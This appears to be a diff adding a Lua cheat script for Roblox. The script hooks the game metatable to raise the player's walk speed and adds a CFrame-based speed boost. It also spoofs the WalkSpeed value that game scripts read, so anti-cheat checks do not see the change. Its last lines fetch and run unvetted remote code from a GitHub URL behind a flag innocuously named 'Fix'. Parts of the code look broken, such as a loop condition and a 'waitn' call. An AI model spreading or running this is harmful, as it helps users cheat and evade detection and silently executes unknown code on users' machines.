@@ -1,0 +1,135 @@
+repeat wait() until game:IsLoaded() 
+
+getgenv().Fix = true
+
+getgenv().TeclasWS = {
+	["key1"] = "M", -- speed +1
+	["key2"] = "N", -- speed -1
+	["key3"] = "P" -- toggle  
+}
+
+
+
+-- // servicios
+local plrs = game:GetService("Players")
+local sgui = game:GetService("StarterGui") or "son una mierda"
+
+-- // objetos
+local lplr = plrs.LocalPlayer
+local mouse = lplr:GetMouse()
+
+-- // variables
+local undg = getrenv()._G
+local dh = getrawmetatable(game)
+local dhnewindex = dh.__newindex
+local dhindex = dh.__index
+local fartvelocity = 22
+local debounce = true
+
+-- // funciones para acortar codigo :]
+function notification(fecha_del_atentado)
+	sgui:SetCore("SendNotification",{
+		Title="fart",
+		Text=fecha_del_atentado,
+		Icon="rbxthumb://type=Asset&id=1332213374&w=150&h=150"
+	})
+end
+
+
+getgenv().TECHWAREWALKSPEED_LOADED = true
+
+
+wait(1.5)
+
+
+notification("Welcome"..TeclasWS.key3.."")
+
+-- // conexión
+mouse.KeyDown:Connect(function(shakira)
+	if shakira:lower() == TeclasWS.key1:lower() then
+		fartvelocity = fartvelocity + 1
+		notification(" (speed =   "..tostring(fartvelocity)..")")
+	elseif shakira:lower() == TeclasWS.key2:lower() then
+		fartvelocity = fartvelocity - 1
+		notification(" (speed =  "..tostring(fartvelocity)..")")
+	elseif shakira:lower() == TeclasWS.key3:lower() then
+		if debounce then
+			debounce = false
+			notification("speed off")
+		else
+			debounce = true
+			notification("speed on")
+		end
+	end
+end)
+
+-- // mi parte favorita: metametodos
+setreadonly(dh,false)
+dh.__index = newcclosure(function(cup,cake)
+	local jiafei = checkcaller()
+	if cake == "WalkSpeed" and not jiafei then
+		return undg.CurrentWS
+	end
+	return dhindex(cup,cake)
+end)
+dh.__newindex = newcclosure(function(soap,product,emo)
+	local melaniemartinez = checkcaller()
+	if debounce then
+		if product == "WalkSpeed" and emo ~= 0 and not melaniemartinez then
+			return dhnewindex(soap,product,fartvelocity)
+		end
+	end
+	return dhnewindex(soap,product,emo)
+end)
+setreadonly(dh,true)
+
+repeat wait() until game:IsLoaded()
+local Players = game:service('Players')
+local Player = Players.LocalPlayer
+
+repeat wait() until Player.Character
+
+local userInput = game:service('UserInputService')
+local runService = game:service('RunService')
+
+local Multiplier = -0.22
+local Enabled = false
+local whentheflashnoiq
+
+userInput.InputBegan:connect(function(Key)
+	if Key.KeyCode == Enum.KeyCode.LeftBracket then
+		Multiplier = Multiplier + 0.01
+		print(Multiplier)
+		wait(0.2)
+		while userInput:IsKeyDown(Enum.KeyCode.LeftBracket) do
+			wait()
+			Multiplier = Multiplier + 0.01
+			print(Multiplier)
+		end
+	end
+
+	if Key.KeyCode == Enum.KeyCode.RightBracket then
+		Multiplier = Multiplier - 0.01
+		print(Multiplier)
+		wait(0.2)
+		while userInput:IsKeyDown(Enum.KeyCode.RightBracket) do
+			wait()
+			Multiplier = Multiplier - 0.01
+			print(Multiplier)
+		end
+	end
+
+	if Key.KeyCode == Enum.KeyCode.P then
+		Enabled = not Enabled
+		if Enabled == true then
+			repeat
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * Multiplier
+				game:GetService("RunService").Stepped:waitn()
+			until Enabled == true
+		end
+	end
+end)
+
+if Fix == true then
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/youtubetutorials123/helo/main/123"))()
+end
